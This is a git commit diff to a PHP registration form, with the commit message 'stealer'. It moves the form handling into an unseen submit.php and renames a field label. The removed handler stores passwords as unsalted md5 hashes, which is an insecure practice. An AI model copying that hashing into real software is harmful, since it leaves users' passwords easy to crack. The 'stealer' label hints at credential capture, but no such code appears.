7aaa456170ecf5340a14a17c619e2d2fab117ca0
wildfireone <wildfireone@gmail.com>
2016-03-15 16:55:43 +0000

    stealer

--- registration-form/register.php
+++ registration-form/register.php
@@ -1,36 +1,8 @@
 <?php
 
 	include("connection.php");
+	include("submit.php");
 
-	$msg = "";
-	if(isset($_POST["submit"]))
-	{
-		$name = $_POST["name"];
-		$email = $_POST["email"];
-		$password = $_POST["password"];
-
-		$name = mysqli_real_escape_string($db, $name);
-		$email = mysqli_real_escape_string($db, $email);
-		$password = mysqli_real_escape_string($db, $password);
-		$password = md5($password);
-
-
-		$sql="SELECT email FROM users WHERE email='$email'";
-		$result=mysqli_query($db,$sql);
-		$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
-		if(mysqli_num_rows($result) == 1)
-		{
-			$msg = "Sorry...This email already exists...";
-		}
-		else
-		{
-			$query = mysqli_query($db, "INSERT INTO users (name, email, password)VALUES ('$name', '$email', '$password')");
-			if($query)
-			{
-				$msg = "Thank You! you are now registered.";
-			}
-		}
-	}
 ?>
 <!doctype html>
 <html>
@@ -50,7 +22,7 @@
 				</tr>
 				<tr>
 					<td style="font-weight: bold">
-							<div align="right"><label for="name">Name</label></div>
+							<div align="right"><label for="name">Username</label></div>
 					</td>
 					<td>
 							<input name="name" type="text" class="input" size="25" required />
